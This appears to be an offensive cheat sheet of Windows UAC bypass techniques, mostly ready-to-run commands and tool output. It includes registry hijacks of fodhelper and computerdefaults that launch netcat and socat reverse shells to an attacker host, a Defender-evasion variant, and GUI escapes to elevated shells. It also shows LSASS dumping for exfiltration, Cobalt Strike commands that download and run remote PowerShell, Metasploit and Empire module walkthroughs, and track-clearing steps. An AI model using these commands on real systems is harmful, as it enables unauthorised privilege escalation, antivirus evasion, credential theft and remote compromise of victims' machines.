## Check UAC Level
```
UACscan.ps1
To confirm if UAC is enabled do:
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
    EnableLUA    REG_DWORD    0x1
    
    If 0 then, UAC won't prompt (like disabled)
    If 1 the admin is asked for username and password to execute the binary with high rights (on Secure Desktop)
    If 2 (Always notify me) UAC will always ask for confirmation to the administrator when he tries to execute something with high privileges (on Secure Desktop)
    If 3 like 1 but not necessary on Secure Desktop
    If 4 like 2 but not necessary on Secure Desktop
    if 5(default) it will ask the administrator to confirm to run non Windows binaries with high privileges
    
Then, you have to take a look at the value of LocalAccountTokenFilterPolicy
If the value is 0, then, only the RID 500 user (built-in Administrator) is able to perform admin tasks without UAC, and if its 1, all accounts inside "Administrators" group can do them.    

And, finally take a look at the value of the key FilterAdministratorToken
If 0(default), the built-in Administrator account can do remote administration tasks and if 1 the built-in account Administrator cannot do remote administration tasks, unless LocalAccountTokenFilterPolicy is set to 1.

Summary
If EnableLUA=0 or doesn't exist, no UAC for anyone
If EnableLua=1 and LocalAccountTokenFilterPolicy=1 , No UAC for anyone
If EnableLua=1 and LocalAccountTokenFilterPolicy=0 and FilterAdministratorToken=0, No UAC for RID 500 (Built-in Administrator)
If EnableLua=1 and LocalAccountTokenFilterPolicy=0 and FilterAdministratorToken=1, UAC for everyone

All this information can be gathered using the metasploit module: post/windows/gather/win_privs

You can also check the groups of your user and get the integrity level:
net user %username%
whoami /groups | findstr Level
```

## CMD Disable UAC in Registry
```
# try to disable UAC
cmd> reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /d 0 /t REG_DWORD
```

## PowerShell Disable UAC
```
Powershell disable UAC
Disable UAC
function Disable-UserAccessControl {
    Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value 00000000
    Write-Host "User Access Control (UAC) has been disabled." -ForegroundColor Green    
}
```
## UAC Disabled
```
If UAC is already disabled (ConsentPromptBehaviorAdmin is 0) you can execute a reverse shell with admin privileges (high integrity level) using something like:
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```

## fodhelper.exe OR computerdefaults.exe
```
Fodhelper
Fodhelper.exe is one of Windows default executables in charge of managing Windows optional features, including additional languages, applications not installed by default, or other operating-system characteristics. Like most of the programs used for system configuration, fodhelper can auto elevate when using default UAC settings so that administrators won’t be prompted for elevation when performing standard administrative tasks. While we’ve already taken a look at an autoElevate executable, unlike msconfig, fodhelper can be abused without having access to a GUI.

Fodhelper
Bypass using Fodhelper: 
fodhelper.exe is a Windows default executable that is required for managing optional Windows features, additional languages, etc.
It is also an automatically executable program.
This means that the administrator will not be prompted by UAC to perform elevated tasks. 
We can performed if there are restrictions to GUI.  

Start Run and type “fodhelper.exe” to open Fodhelper. 

For example, say if we are opening a html file. 
The windows will go to registry > HKEY_CLASSES_ROOT to check for which client application is must be used to open it. 
The command is defined in ‘shell\open\command’ subkey i.e., the iexplore.exe. 

We can then change the data of the value named ‘DelegateExecute’ in the registry within the “HKCU\Software\Classes\ms-settings\Shell\Open\command” for the fodhelper to replace with our own script to get a reverse shell. 
Let’s say an attacker managed to attack the machine and get an administrator level account, but if UAC is restricting from performing an elevated execution.  
C:\> set SHELL="powershell -windowstyle hidden C:\Tools\nc64.exe <ATTACKER_IP> 443"

We can create a malicious script to provide a reverse shell back to the attacker machine and store it in an Environment variable.
C:\> reg add “HKCU\Software\Classes\ms-settings\Shell\Open\command” /v "DelegateExecute" /d "" /f
Create an empty value named “DelegateExecute” inside the registry key “HKCU\Software\Classes\ms-settings\Shell\Open\command”.

So that the system-wide association can be used at HKLU (HKEY_LOCAL_USER) instead of user-specific association based at HKCU (HKEY_CURRENT_USER). In other words
C:\> reg add %REG_KEY% /d %SHELL% /f

We can check by running ‘Registry Editor’ in windows to check if the key values are updated in ‘HKCU\Software\Classes\ms-settings\Shell\Open\command’.

Example:
# UAC BYPASS using Fodhelper.exe or Computer Defaults.exe
where /r C:\windows fodhelper.exe
where /r C:\windows computerdefaults.exe

New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value {C:\Users\Public\Downloads\revshell.exe} -Force
New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force
cmd

powershell Start-Process C:\Windows\System32\fodhelper.exe -WindowStyle Hidden
powershell Start-Process C:\windows\system32\computerdefaults.exe -WindowStyle Hidden

Example:
 As user is medium integrity level member we can inject payload and make to communicate to parent
 We can set required registry value to the ms-settings class to get a reverse connection by using reverse shell. 
 here i’m going to use socat and set registry as below :
 
 C:\> set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
 C:\> set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4444 EXEC:cmd.exe,pipes"
 C:\> reg add %REG_KEY% /v “DelegateExecute” /d “” /f
 C:\> reg add %REG_KEY% /d %CMD% /f

As above we are using socat which is type of reverse shell connection , and we will setup listener at attacker end to obtain a high privilege reverse shell connection.

Kali Box: socat TCP4-LISTEN:443,fork STDOUT
Windows Box: socat -d -d TCP4:<attacker ip>:443 EXEC:'cmd.exe',pipes 

Clearing our tracks
reg delete HKCU\Software\Classes\ms-settings\ /f
execute the command and clear artifacts and interference with all tasks

```

## Bypassing Windows Defender (CurVer)
```
C:\> set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
C:\> set CMD=”powershell -windowstyle hidden C: \Tools\nc64.exe -e cmd.exe 10.10.31.232 443"
C:\> reg add %REG_KEY% /v “DelegateExecute” /d “” /f
C:\> reg add %REG_KEY% /d %CMD% /f

Trying Fodhelper it looks like Windows Defender is able to flag this as a malicious activity for modifying the registry value. 

How do we bypass common AntiVirus checks? 

We can make use of CurVer. So CurVer is a value used in ProgID that specifies the default version of the application to be used when opening a certain file type in Windows.
What we do is create a new ProgID entry in the registry with our own choice of name.
Then point that CurVer entry in ms–settings‘s ProgID to the new ProgID that we created.

C:\> $program = "powershell -windowstyle hidden C:\Windows\System32\cmd.exe"
C:\> New-Item "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Force
C:\> Set-ItemProperty "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Name "(default)" -Value $program -Force
C:\> New-Item -Path "HKCU:\Software\Classes\ms-settings\CurVer" -Force
C:\> Set-ItemProperty "HKCU:\Software\Classes\ms-settings\CurVer" -Name "(default)" -value ".hack" -Force
C:\> Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden

So, what this script does is create a new progID with the name “.hack” and then directly associate the payload with the command used when opening such files. which then points the CurVer entry of ms-settings to our “.hack” progID. When fodhelper tries opening an ms-settings program, it will instead be pointed to the “.hack” program ID and use its associated command. 
```

## msconfig (RUN)
```
Case study : msconfig
Spawn run and enter msconfig
There are exemptions that allow certain program binaries to execute without prompts, in this case, msconfig
    Now navigate to “Tools” and launch command prompt.

We will obtain a high IL command prompt without interacting with UAC in any way.
The mitigation for this is to set UAC to the maximum level
```

## azman.msc (RUN)
```
AZMAN.MSC
Run azman.msc
Click Help
Right click on the right-hand pane and click VIEW SOURCE
From notepad click FILE OPEN
Right click + shift and click open powershell window here
And now you have a process with high integrity

example 2:
asman.msc
Case Study : azman.msc (Authorization manager)
    As with msconfig, azman.msc will auto elevate without requiring user interaction. 
    If we can find a way to spawn a shell from within that process, we will bypass UAC. 
    Note that, unlike msconfig, azman.msc has no intended built-in way to spawn a shell.
    
first spawn run and run azman.msc
To run shell we will abuse the application’s help    
We will right-click any part of the help menu, you can click on “help topics', then right click and ”view source",  select view source
Notepad will open, go to tabs and click open
open C:\Windows\System32\cmd.exe
```

## appverif.exe (RUN)
```
It's almost the same as the azman.msc bypass:
open run
run appverif --> Click yes and allow to run.
help (f1)
right click ----> View Source Code
Notepad will open, go to open
open C:\Windows\System32\cmd.exe
```

## Notepad (RUN)
```
run Notepad        
This will spawn a notepad process that we can leverage to get a shell. 
 go to File->Open and make sure to select All Files in the combo box on the lower right corner. 
 Go to C:\Windows\System32 and search for cmd.exe and open the program       
 This will open cmd.exe at a high privsec level.
```

## iscsicpl.exe
```
Another method comes from running c:\windows\system32\iscsicpl.exe
Click No
Click CONFIGURATION
Click REPORT
Right Click + SHIFT and Open Powershell
```

## Task Scheduler
```
Open Task Scheduler
On the right in the actions panel, go to create task.
Create a new task named shellz in \ , select run only when user is logged on and run with the highest privileges.
Go to Actions in create task.
add a new action
Action: Start a Program, cmd
Click ok
Right click and run the task
```

## LOLBAS / MMC / Device Manager / Group Policy Editor etc. 
```
Spawn Run
mmc devmgmt.msc
Click Help
Help Topics
Rick click and view source
Use the file open and then RIGHT CLICK + SHIFT to launch a shell Graphical user interface Description automatically generated

You can run these with all kinds of the .msc consoles:

MORE
A list of more binaries we can use:
netplwiz.exe
dcomcnfg.exe
perfmon.exe
compMgmtLauncher.exe
eventvwr.exe

There’s lots of ways of doing this via binaries.
```

## netplwiz.exe LOLBAS and LSASS from taskmgr.exe
```
netplwiz.exe is used to change the user membership to Standard user, Administrator, Guest, or any other profile; however, the primary functionality is not what really matters here. We are interested in abusing this using unintended functionality.

Start by typing netplwiz.exe in the medium-integrity command prompt of the local admin user that was spawned using the runas command.
Then, select the “Advanced” tab and select the “Advanced” option in the Advanced user management section.
The Local Users and Groups (Local) box will open. From that box select Help > Help Topics
Right-click in the MMC box and select View Source — This will open up a notepad TXT document of the source code.
On the Notepad document that opened, select File > Open
Navigate to Computer > Local Disk (C:) > Windows > System32 and then change filetype to All Files
Scroll down to find cmd.exe and then Right-click cmd.exe > select “Run as administrator”
A high-integrity cmd Prompt at your service.

This same technique could be used to run taskmgr.exe instead of cmd.exe as administrator and then you could perform a memory dump on the LSASS process: 

Dump Lsass from taskmgr.exe:
Dumping the LSASS Process: Task Manager (GUI)
use the credentials of the local administrator account that we created, and RDP into the host to obtain a GUI session.
sudo xfreerdp /u:pwnt /p:'Password123' /v:172.16.1.50 +clipboard
After confirming that we have local admin privileges on the system, we can proceed to dump the LSASS process.
Since we have GUI access on the victim, the first way we will dump the LSASS process is by using Task Manager.
To create a process dump file, right click on the task bar (bottom bar) and then click Task Manager.
Next, we need to click the More Details drop down arrow and then go to the Details tab. From there, we can scroll down and then right-click on lsass.exe and select “Create Dump File”.
If it works, a popup box will appear that shows us the path to the DMP file.
The dump was successfully created and is ready for us to exfiltrate onto our attacker machine.
```


## UAC-bypass.c (https://github.com/k4sth4/UAC-bypass/blob/main/eventvwr-bypassuac.c)
```
check if UAC turned on
cmd> reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA                  REG_DWORD 0x1 # if 0x1 = UAC ENABLED
ConsentPromptBehaviorAdmin REG_DWORD 0x5 # if NOT 0x0 = consent required
PromptOnSecureDesktop      REG_DWORD 0x1 # if 0x1 = Force all credential/consent prompts

try to disable UAC
cmd> reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /d 0 /t REG_DWORD

STEP 2: Prepare exploits

# modify uac-bypass.c to execute reverse shell
# compile w/ correct architecture
$ x86_64-w64-mingw32-gcc ~/OSCP-2022/Tools/privesc-windows/uac-bypass.c -o uac-bypass.exe  <-- https://github.com/k4sth4/UAC-bypass/blob/main/eventvwr-bypassuac.c

# generate reverse shell payload
$  msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=[kali] LPORT=666 -f exe -o rshell.exe

STEP 3: Transfer, setup listener and exec payload

cmd> copy \\[kali]\[share]\uac-bypass.exe uac-bypass.exe
cmd> copy \\[kali]\[share]\rshell.exe rshell.exe
cmd> .\uac-bypass.exe
```

## Meterpreter UAC Bypass (CLI)
```
There are several post-exploitation modules we can deploy against an active meterpreter session.
Sessions that were created through attack vectors such as the execution of a client-side attack will likely provide us only with an unprivileged shell.
But if the target user is a member of the local administrators group, we can elevate our shell to a high integrity level if we can bypass User Account Control (UAC)
Enter getsystem to elevate our privileges. Then, we use ps to identify the process ID of OneDrive.exe, and migrate to it.

meterpreter > getsystem
...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).

meterpreter > ps
8044   3912  OneDrive.exe                 

meterpreter > migrate 8044
[*] Migrating from 9020 to 8044...
[*] Migration completed successfully.

While this is an administrative account, UAC prevents us from performing administrative operations.
Before we attempt to bypass UAC, let's confirm that the current process has the integrity level Medium.
To display the integrity level of a process, we can use tools such as Process Explorer or third-party PowerShell modules such as NtObjectManager. 
Once we import the module with Import-Module,4 we can use Get-NtTokenIntegrityLevel5 to display the integrity level of the current process by retrieving and reviewing the assigned access token.

meterpreter > shell
Process 6436 created.
Channel 1 created.
Microsoft Windows [Version 10.0.22000.795]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> powershell -ep bypass
powershell -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\system32> Import-Module NtObjectManager
Import-Module NtObjectManager

PS C:\Windows\system32> Get-NtTokenIntegrityLevel
Get-NtTokenIntegrityLevel
Medium

Next, let's background the currently active channel and session to search for and leverage UAC post-exploitation modules.

PS C:\Windows\system32> ^Z
Background channel 1? [y/N]  y

meterpreter > bg
[*] Backgrounding session 9...

Now let's search for UAC bypass modules:
msf6 exploit(multi/handler) > search UAC

The search yields quite a few results.
One very effective UAC bypass on modern Windows systems is exploit/windows/local/bypassuac_sdclt, which targets the Microsoft binary sdclt.exe.
This binary can be abused to bypass UAC by spawning a process with integrity level High

To use the module, we'll activate it and set the SESSION and LHOST options as shown in the following listing. Setting the SESSION for post-exploitation modules allows us to directly execute the exploit on the active session. Then, we can enter run to launch the module.

Executing a UAC bypass using a Meterpreter session:
msf6 exploit(multi/handler) > use exploit/windows/local/bypassuac_sdclt
msf6 exploit(windows/local/bypassuac_sdclt) > show options
msf6 exploit(windows/local/bypassuac_sdclt) > set SESSION 9
SESSION => 32
msf6 exploit(windows/local/bypassuac_sdclt) > set LHOST 192.168.119.4
LHOST => 192.168.119.4
msf6 exploit(windows/local/bypassuac_sdclt) > run

[*] Started reverse TCP handler on 192.168.119.4:4444 
[*] UAC is Enabled, checking level...
[+] Part of Administrators group! Continuing...
[+] UAC is set to Default
[+] BypassUAC can bypass this setting, continuing...
[!] This exploit requires manual cleanup of 'C:\Users\offsec\AppData\Local\Temp\KzjRPQbrhdj.exe!
[*] Please wait for session and cleanup....
[*] Sending stage (200774 bytes) to 192.168.50.223
[*] Meterpreter session 10 opened (192.168.119.4:4444 -> 192.168.50.223:49740) at 2022-08-04 09:03:54 -0400
[*] Registry Changes Removed

Check Integrity Level:
meterpreter > shell
Process 2328 created.
Channel 1 created.
Microsoft Windows [Version 10.0.22000.795]
(c) Microsoft Corporation. All rights reserved.
C:\Windows\system32> powershell -ep bypass
powershell -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> Import-Module NtObjectManager
Import-Module NtObjectManager

PS C:\Windows\system32> Get-NtTokenIntegrityLevel
Get-NtTokenIntegrityLevel
High

The process our payload runs in has the integrity level High and therefore we have successfully bypassed UAC.
```

## Evil-Winrm 4MSI Bypass (CLI + winrm)
```
evil-winrm -i 192.168.1.19 -u administrator -p Riviera -s /opt/privsc/powershell
Bypass-4MSI
Invoke-Mimikatz.ps1
Invoke-Mimikatz
```

## KRBUACBypass (GUI)
```
https://github.com/wh0amitz/KRBUACBypass/releases/tag/v1.0.0
UAC Bypass By Abusing Kerberos Tickets 
First request a ticket for the HOST service of the current server through the asktgs function, and then create a system service through krbscm to gain the SYSTEM privilege.

KRBUACBypass.exe asktgs
KRBUACBypass.exe krbscm
```

## UAC bypass with Cobalt Strike
```
The Cobalt Strike techniques will only work if UAC is not set at it's max security level.
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```

## EventViewer
```
https://ivanitlearning.wordpress.com/2019/07/07/bypassing-default-uac-settings-manually/
Generate MSFvenom .exe payload: run.exe

Change binary in evenvwrbypass.c to payload
strcat(curPath, "\run.exe");

Compile to .exe: 64 ot 32 bit
x86_64-w64-mingw32-gcc eventvwrbypass.c -o eventvwr-bypassuac-64.exe
i686-w64-mingw32-gcc eventvwrbypass.c -o eventvwr-bypassuac-32.exe
# -static flag for library issues

Run Executable with listener setup in same directory as MSFvenom payload
eventvwr-bypassuac-64.exe
eventvwr-bypassuac-32.exe
```

## Empire (bypassuac module)
```
Here's an example of how to use the bypassuac module in the Empire client console:
[+] New agent Y4LHEV83 checked in
[*] Sending agent (stage 2) to Y4LHEV83 at 192.168.204.135
(empire usestager/windows/ducky) > usemodule powershell/privesc/bypassuac

 Author       Leo Davidson                                                           
              @meatballs__                                                           
              @TheColonial                                                           
              @mattifestation                                                        
              @harmyj0y                                                              
              @sixdub                                                                
 Background   True                                                                   
 Comments     https://github.com/mattifestation/PowerSploit/blob/master/CodeExecutio 
              n/Invoke--Shellcode.ps1                                                
              https://github.com/rapid7/metasploit-framework/blob/master/modules/exp 
              loits/windows/local/bypassuac_injection.rb                             
              https://github.com/rapid7/metasploit-framework/tree/master/external/so 
              urce/exploits/bypassuac_injection/dll/src                              
              http://www.pretentiousname.com/                                        
 Description  Runs a BypassUAC attack to escape from a medium integrity process to a 
              high integrity process. This attack was originally discovered by Leo   
              Davidson. Empire uses components of MSF's bypassuac injection          
              implementation as well as an adapted version of PowerSploit's Invoke-- 
              Shellcode.ps1 script for backend lifting.                              
 Language     powershell                                                             
 Name         powershell/privesc/bypassuac                                           
 NeedsAdmin   False                                                                  
 OpsecSafe    False                                                                  
 Techniques   http://attack.mitre.org/techniques/T1088                               


,Record Options----,--------------------,----------,-------------------------------------,
| Name             | Value              | Required | Description                         |
|------------------|--------------------|----------|-------------------------------------|
| Agent            |                    | True     | Agent to run module on.             |
|------------------|--------------------|----------|-------------------------------------|
| Bypasses         | mattifestation etw | False    | Bypasses as a space separated list  |
|                  |                    |          | to be prepended to the launcher.    |
|------------------|--------------------|----------|-------------------------------------|
| Listener         |                    | True     | Listener to use.                    |
|------------------|--------------------|----------|-------------------------------------|
| Obfuscate        | False              | False    | Switch. Obfuscate the launcher      |
|                  |                    |          | powershell code, uses the           |
|                  |                    |          | ObfuscateCommand for obfuscation    |
|                  |                    |          | types. For powershell only.         |
|------------------|--------------------|----------|-------------------------------------|
| ObfuscateCommand | Token\All\1        | False    | The Invoke-Obfuscation command to   |
|                  |                    |          | use. Only used if Obfuscate switch  |
|                  |                    |          | is True. For powershell only.       |
|------------------|--------------------|----------|-------------------------------------|
| Proxy            | default            | False    | Proxy to use for request (default,  |
|                  |                    |          | none, or other).                    |
|------------------|--------------------|----------|-------------------------------------|
| ProxyCreds       | default            | False    | Proxy credentials                   |
|                  |                    |          | ([domain\]username:password) to use |
|                  |                    |          | for request (default, none, or      |
|                  |                    |          | other).                             |
|------------------|--------------------|----------|-------------------------------------|
| UserAgent        | default            | False    | User-agent string to use for the    |
|                  |                    |          | staging request (default, none, or  |
|                  |                    |          | other).                             |
'------------------'--------------------'----------'-------------------------------------'

(Empire: usemodule/powershell/privesc/bypassuac) > set Agent Y4LHEV83
[*] Set Agent to Y4LHEV83
(Empire: usemodule/powershell/privesc/bypassuac) > set Listener listener1
[*] Set Listener to listener1
(Empire: usemodule/powershell/privesc/bypassuac) > execute
[*] Tasked Y4LHEV83 to run Task 1
...

Now wait for the results to come.
```








